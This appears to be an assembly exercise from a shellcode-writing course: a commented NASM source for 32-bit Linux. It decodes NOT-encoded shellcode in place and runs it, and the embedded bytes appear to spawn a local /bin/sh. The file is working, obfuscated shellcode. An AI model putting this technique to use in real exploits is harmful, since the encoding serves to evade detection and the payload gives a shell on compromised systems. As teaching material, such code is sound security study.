; Executable name       : not-decode
; Designed OS           : Linux (32-bit)
; Author		: wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : An example of decoding encoded NOT shellcode
;
; Build using these commands:
;       nasm -f elf32 -o not-decode.o not-decode.asm
;       ld -o not-decode not-decode.o
;       objdump -D not-decode -M intel
;

SECTION .text

global _start

_start:
	jmp short call_shell				; JMP to call_shell label

decoder:
	pop ebx						; POP shellcodes address into EBX
	xor ecx,ecx					; zero out ECX
	mov cl,19					; store 19 into CL for counter
							; AKA len(shellcode)
decode:
	not byte [ebx]					; NOT every byte to decode
	inc ebx						; increment through every char
	loop decode					; LOOP 19 times since CL = 19
	jmp short shellcode				; once loop is done all chars
							; have been decoded so run it!
call_shell:
	call decoder					; CALL the decoder (next instruction)
							; saved on the stack AKA shellcode
shellcode:
	db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97	; encoded shellcode
	db 0x97,0xd0,0x9d,0x96,0x91,0x4f,0xf4,0x76	; ^
	db 0x1c,0x32,0x7f				; |

